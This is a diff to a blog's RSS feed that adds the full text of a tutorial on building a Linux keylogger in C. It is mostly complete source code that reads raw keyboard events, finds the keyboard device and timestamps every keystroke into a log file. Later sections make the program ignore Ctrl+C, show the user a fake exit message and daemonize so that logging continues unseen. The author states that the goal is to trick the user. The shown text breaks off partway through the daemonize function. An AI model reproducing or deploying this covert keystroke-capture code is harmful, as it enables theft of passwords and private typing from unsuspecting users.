@@ -1,21 +1,384 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
     <title>keylogger on Connected</title>
     <link>https://ayedaemon.github.io/tags/keylogger/</link>
     <description>Recent content in keylogger on Connected</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 02 Feb 2021 14:47:26 +0530</lastBuildDate>
-    <atom:link href="https://ayedaemon.github.io/tags/keylogger/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 02 Feb 2021 14:47:26 +0530</lastBuildDate><atom:link href="https://ayedaemon.github.io/tags/keylogger/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Keylogger for Linux</title>
       <link>https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/</link>
       <pubDate>Tue, 02 Feb 2021 14:47:26 +0530</pubDate>
+      
       <guid>https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/</guid>
       <description>&lt;blockquote&gt;
 &lt;p&gt;Developing a low level keylogger for linux using C.&lt;/p&gt;
 &lt;/blockquote&gt;</description>
+      <content:encoded><![CDATA[<blockquote>
+<p>Developing a low level keylogger for linux using C.</p>
+</blockquote>
+<p>I am putting this blog in a bottom-up approach. We&rsquo;ll start with the basic program that can act as a keylogger.</p>
+<h3 id="what-is-a-keylogger-how-to-make-one">What is a Keylogger?? How to make one?</h3>
+<blockquote>
+<p>Keylogger is a program (or a hardware sometimes) that logs all the keystrokes made by the keyboard.</p>
+</blockquote>
+<p>We know that there is something in OS that listens to the keyboard events and perform actions accordingly. For example, when we press <em>alt+tab</em> it changes the current focus to another application/screen.</p>
+<p>According to wikipedia, in linux, the <a href="https://en.wikipedia.org/wiki/Evdev">event devices</a> generalizes all the raw input from device drivers and makes them available through character devices in <code>/dev/input/</code> directory.</p>
+<p><em>(If you don&rsquo;t know about <code>character devices</code>, think it as a real-time stream data)</em></p>
+<p>All the event files/devices are located in <code>/dev/input/</code> directory. It was very easy to figure out the file after looking at the directory structure.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*X9cxcchj9h9vGjHKAtG_mg.png" alt="directory-structure"  />
+</p>
+<p>It is pretty obvious that my keyboard event file is <code>/dev/input/by-path/platform-i8042-serio-0-event-kbd</code>. (For you, this may change, but it&rsquo;ll have <strong>kbd</strong> in it&rsquo;s name!!)</p>
+<p>So I wrote a program that will continuously read data from this file and print it on screen.</p>
+<p>CODE - <code>basic_keylogger.c</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/input.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">input_event</span> <span class="n">ev</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">//This is the keyboard event file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span><span class="o">*</span> <span class="n">kbd_path</span> <span class="o">=</span> <span class="s">&#34;/dev/input/by-path/platform-i8042-serio-0-event-kbd&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">kbd_path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Error %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">errno</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ev</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">input_event</span><span class="p">));</span> <span class="c1">//read from keyboard
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%i - %i</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">ev</span><span class="p">.</span><span class="n">code</span><span class="p">,</span> <span class="n">ev</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Compile this and run it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## Compile
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gcc basic_keylogger.c -o basic_keylogger.out
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">## Execute it
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./basic_keylogger.out
+</span></span></code></pre></div><p>This will give output something like this.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*Y-Z4wh_4BDSNLf6v1_NF8Q.png" alt="output1"  />
+</p>
+<p>I am not sure about what this all is. But I saw some pattern and decided to learn more on this later. The pattern here is, whenever <code>ev.value</code> is <code>1</code> then I am getting a <code>ev.code</code> unique for each key. So I decided to just filter out the data with <code>ev.value == 1</code>.</p>
+<p>CODE - <code>basic_keylogger.c</code> (minor modification)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/input.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">input_event</span> <span class="n">ev</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">//This is the keyboard event file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span><span class="o">*</span> <span class="n">kbd_path</span> <span class="o">=</span> <span class="s">&#34;/dev/input/by-path/platform-i8042-serio-0-event-kbd&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">kbd_path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Error %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">errno</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ev</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">input_event</span><span class="p">));</span> <span class="c1">//read from keyboard
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">ev</span><span class="p">.</span><span class="n">value</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%i - %i</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">ev</span><span class="p">.</span><span class="n">code</span><span class="p">,</span> <span class="n">ev</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>After again compiling and running this, I was just getting the useful data from everything.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*zRFTkTAQGKSMSspmAxqCjg.png" alt="useful-raw-data"  />
+</p>
+<p>This is the simple idea of making the keylogger. But there are a lot of things we haven&rsquo;t done.</p>
+<h3 id="making-our-keylogger-more-dynamic">Making our keylogger more dynamic.</h3>
+<p>Till now, we are using hard coded file name for the keyboard. We can make it more dynamic by searching for the <strong>kbd</strong> file in <code>/dev/input/by-path/</code> and then read that file for the events. And then save the events in a file.</p>
+<p>For this purpose, I have changed the working directory structure to make the project more modular.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*2VyFdbneXRLZPXuScZGCPg.png" alt=""  />
+</p>
+<p>CODE:- <code>basic_keylogger.c</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#include &#34;basic_keylogger.h&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">int main(void) {
+</span></span><span class="line"><span class="cl">  errno = 0;
+</span></span><span class="line"><span class="cl">  struct input_event ev;
+</span></span><span class="line"><span class="cl">  char* kbd = get_me_a_keyboard(); // Get keyboard name
+</span></span><span class="line"><span class="cl">  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  int fd = open(kbd_path, O_RDONLY);
+</span></span><span class="line"><span class="cl">  if(fd == -1)
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    printf(&#34;Error %d\n&#34;, errno);
+</span></span><span class="line"><span class="cl">    exit(EXIT_FAILURE);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  printf(&#34;Reading from %s\n&#34;,kbd_path);
+</span></span><span class="line"><span class="cl">  free(kbd_path); // free some memory
+</span></span><span class="line"><span class="cl">  while (1)
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
+</span></span><span class="line"><span class="cl">    if(ev.type == 1)
+</span></span><span class="line"><span class="cl">      log_in_file(ev); //log the event
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  return 0;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>This main program <em>includes</em> <code>basic_keylogger.h</code> file - which I have used to include all the libraries and <em>define</em> macros.</p>
+<p>CODE:- <code>basic_keylogger.h</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">//
+</span></span></span><span class="line"><span class="cl"><span class="cm">// defining variables
+</span></span></span><span class="line"><span class="cl"><span class="cm">//
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define INPUT_EVENT_DIR &#34;/dev/input/by-path/&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_FILE &#34;/tmp/keylog.txt&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">//
+</span></span></span><span class="line"><span class="cl"><span class="cm">// importing system headers
+</span></span></span><span class="line"><span class="cl"><span class="cm">//
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;dirent.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/input.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">//
+</span></span></span><span class="line"><span class="cl"><span class="cm">// importing utility functions
+</span></span></span><span class="line"><span class="cl"><span class="cm">//
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;utils/logger.c&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;utils/helpers.c&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;utils/keyboard.c&#34;</span><span class="cp">
+</span></span></span></code></pre></div><p>Here are 3 more files included for obvious purposes.</p>
+<p>CODE:- <code>utils/logger.c</code> (logger function)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">void log_in_file(struct input_event ev)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  printf(&#34;Logging&#34;);
+</span></span><span class="line"><span class="cl">    time_t t = time(NULL);
+</span></span><span class="line"><span class="cl">    struct tm tm = *localtime(&amp;t);
+</span></span><span class="line"><span class="cl">    FILE* fptr = fopen(LOG_FILE, &#34;a&#34;);
+</span></span><span class="line"><span class="cl">    // print( [date time] keycode keyvalue ) - keyvalue =&gt; {press; lift; long press}
+</span></span><span class="line"><span class="cl">    fprintf(fptr, &#34;[ %d-%02d-%02d %02d:%02d:%02d ]   key %i state %i\n&#34;, tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ev.code, ev.value);
+</span></span><span class="line"><span class="cl">    if(tm.tm_sec == 0)
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">      /* Do whatever you want to do here
+</span></span><span class="line"><span class="cl">        It is like a scheduler section.*/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      //fprintf(fptr, &#34;%s\n&#34;, &#34;1 minute check\n&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    fclose(fptr);
+</span></span><span class="line"><span class="cl">    printf(&#34;  logged\n&#34;);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>CODE:- <code>utils/helpers.c</code> (now only used for concatination of 2 strings)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">char* concat(const char *s1, const char *s2)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    const size_t len1 = strlen(s1);
+</span></span><span class="line"><span class="cl">    const size_t len2 = strlen(s2);
+</span></span><span class="line"><span class="cl">    char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator
+</span></span><span class="line"><span class="cl">    // in real code you would check for errors in malloc here
+</span></span><span class="line"><span class="cl">    memcpy(result, s1, len1);
+</span></span><span class="line"><span class="cl">    memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
+</span></span><span class="line"><span class="cl">    return result;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>CODE:- <code>utils/keyboard.c</code> (get keyboard device from the directory)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">char* get_me_a_keyboard()
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  struct dirent **namelist;
+</span></span><span class="line"><span class="cl">  int n=0,i=0;
+</span></span><span class="line"><span class="cl">  n = scandir(INPUT_EVENT_DIR, &amp;namelist, NULL, alphasort); // read the directory for the files
+</span></span><span class="line"><span class="cl">  if(n==-1)
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    // perror(&#34;Scandir Failed!!\n&#34;);
+</span></span><span class="line"><span class="cl">    exit(EXIT_FAILURE);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  if(n&lt;=2){
+</span></span><span class="line"><span class="cl">    // perror(&#34;No devices found!!\n&#34;);
+</span></span><span class="line"><span class="cl">    exit(EXIT_FAILURE);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  // printf(&#34;[ * ] %d Devices found !!\n&#34;,n-2);
+</span></span><span class="line"><span class="cl">  for(i=0; i&lt;n; i++)
+</span></span><span class="line"><span class="cl">    if( namelist[i]-&gt;d_name == &#34;.&#34; || namelist[i]-&gt;d_name == &#34;..&#34;) // skip for . and ..
+</span></span><span class="line"><span class="cl">      continue;
+</span></span><span class="line"><span class="cl">    else if(strstr(namelist[i]-&gt;d_name,&#34;kbd&#34;)) // check if the filename has &#34;kbd&#34; (keyboard) in it
+</span></span><span class="line"><span class="cl">      break;  // if yes, do not look further
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  return namelist[i]-&gt;d_name; // and return keyboard file name to caller function
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>After compiling and executing the binary. We get <strong>logging - logged</strong> message on the terminal and the actual log is being stored in <code>/tmp/keylog.txt</code> file - as mentioned in <code>basic_keylogger.h</code> file.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*ikK7hBwfMweto2rYqhaBFg.png" alt=""  />
+</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*8wYAQGNMNS7TymthEnSb6g.png" alt=""  />
+</p>
+<hr>
+<h3 id="what-next-getting-evil">What next? &hellip;Getting evil!!</h3>
+<p>We can close the program by pressing <em>ctrl+c</em> or send it to background by <em>ctrl+z</em>. These key combinations send a signal to the process to close.
+And we can handle these signals in our code&hellip;. using <code>signal.h</code> header file. (import this in the code.)</p>
+<p>CODE - <code>basic_keylogger.c</code> (added signal handlers)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#include &#34;basic_keylogger.h&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Signal handler function
+</span></span><span class="line"><span class="cl">void signal_handler(int sig) {
+</span></span><span class="line"><span class="cl">  printf(&#34;Sorry, But I won&#39;t exit.\n&#34;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">int main(void) {
+</span></span><span class="line"><span class="cl">  errno = 0;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  struct sigaction signal; // create signal action struct
+</span></span><span class="line"><span class="cl">  signal.sa_handler = signal_handler; // initialize the handler function
+</span></span><span class="line"><span class="cl">  sigaction(SIGINT, &amp;signal, NULL); // assign the signal action to a specific signal
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  struct input_event ev;
+</span></span><span class="line"><span class="cl">  char* kbd = get_me_a_keyboard(); // Get keyboard name
+</span></span><span class="line"><span class="cl">  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  int fd = open(kbd_path, O_RDONLY);
+</span></span><span class="line"><span class="cl">  if(fd == -1)
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    printf(&#34;Error %d\n&#34;, errno);
+</span></span><span class="line"><span class="cl">    exit(EXIT_FAILURE);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  printf(&#34;Reading from %s\n&#34;,kbd_path);
+</span></span><span class="line"><span class="cl">  free(kbd_path); // free some memory
+</span></span><span class="line"><span class="cl">  while (1)
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
+</span></span><span class="line"><span class="cl">    if(ev.type == 1)
+</span></span><span class="line"><span class="cl">      log_in_file(ev); //log the event
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  return 0;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>As expected with this code, I am unable to close the program with <em>ctrl+c</em>. Whenever I am pressing it, it gives me a message that <strong>&ldquo;Sorry, But I won&rsquo;t exit.&rdquo;</strong></p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*882rJMJZjAMEce-EupTVhg.png" alt=""  />
+</p>
+<p>This program can only be terminated with <strong>kill</strong> signal. See <a href="https://www.linux.com/training-tutorials/how-kill-process-command-line/">here</a> to know how.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*atvzfHlH5gEBaNw3PcoDgA.png" alt=""  />
+</p>
+<h3 id="going-undercover">Going undercover</h3>
+<p>What if we trick user with a false closing message and go undercover <a href="https://notes.shichao.io/apue/ch13/">(Daemon process)</a>.</p>
+<p>The idea is to create the process as a daemon process whenever the user press <em>ctrl+c</em>. Also give the user a good message so that he actually believes that the process has closed and then probably he&rsquo;ll not check for the running processes to find if it actually has closed.</p>
+<p>To achieve this, I&rsquo;ll make slight changes to my <code>signal_handler</code> function and add a <code>daemonize</code> function to create a daemon process. If you have already not seen what a daemon process is and how to create one - Look <a href="https://notes.shichao.io/apue/ch13/">here</a>.</p>
+<p>CODE:- <code>basic_keylogger.c</code> (changed the signal_handler function)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#include &#34;basic_keylogger.h&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Signal handler function
+</span></span><span class="line"><span class="cl">void signal_handler(int sig) {
+</span></span><span class="line"><span class="cl">  printf(&#34;Exiting very gracefully :)&#34;); //fake message
+</span></span><span class="line"><span class="cl">  daemonize(); // Go undercover
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">int main(void) {
+</span></span><span class="line"><span class="cl">  errno = 0;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  struct sigaction signal; // create signal action struct
+</span></span><span class="line"><span class="cl">  signal.sa_handler = signal_handler; // initialize the handler function
+</span></span><span class="line"><span class="cl">  sigaction(SIGINT, &amp;signal, NULL); // assign the signal action to a specific signal
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  struct input_event ev;
+</span></span><span class="line"><span class="cl">  char* kbd = get_me_a_keyboard(); // Get keyboard name
+</span></span><span class="line"><span class="cl">  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  int fd = open(kbd_path, O_RDONLY);
+</span></span><span class="line"><span class="cl">  if(fd == -1)
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    printf(&#34;Error %d\n&#34;, errno);
+</span></span><span class="line"><span class="cl">    exit(EXIT_FAILURE);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  printf(&#34;Reading from %s\n&#34;,kbd_path);
+</span></span><span class="line"><span class="cl">  free(kbd_path); // free some memory
+</span></span><span class="line"><span class="cl">  while (1)
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
+</span></span><span class="line"><span class="cl">    if(ev.type == 1)
+</span></span><span class="line"><span class="cl">      log_in_file(ev); //log the event
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  return 0;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>Here, I am using <code>daemonize</code> funtion which is defined in <code>./utils/daemonize.c</code> and imported in <code>basic_keylogger.h</code>.</p>
+<p>CODE:- <code>daemonize.c</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">int daemonize()
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    pid_t pid, sid;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    /* Fork off the parent process */
+</span></span><span class="line"><span class="cl">    pid = fork();
+</span></span><span class="line"><span class="cl">    if (pid &lt; 0) {
+</span></span><span class="line"><span class="cl">        exit(EXIT_FAILURE);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    /* If we got a good PID, then
+</span></span><span class="line"><span class="cl">        we can exit the parent process. */
+</span></span><span class="line"><span class="cl">    if (pid &gt; 0) { // Child can continue to run even after the parent has finished executing
+</span></span><span class="line"><span class="cl">        exit(EXIT_SUCCESS);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    /* Change the file mode mask */
+</span></span><span class="line"><span class="cl">    umask(0);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    /* Open any logs here */
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    /* Create a new SID for the child process */
+</span></span><span class="line"><span class="cl">    sid = setsid();
+</span></span><span class="line"><span class="cl">    if (sid &lt; 0) {
+</span></span><span class="line"><span class="cl">        /* Log the failure */
+</span></span><span class="line"><span class="cl">        exit(EXIT_FAILURE);
+</span></span><span class="line"><span class="cl">    }
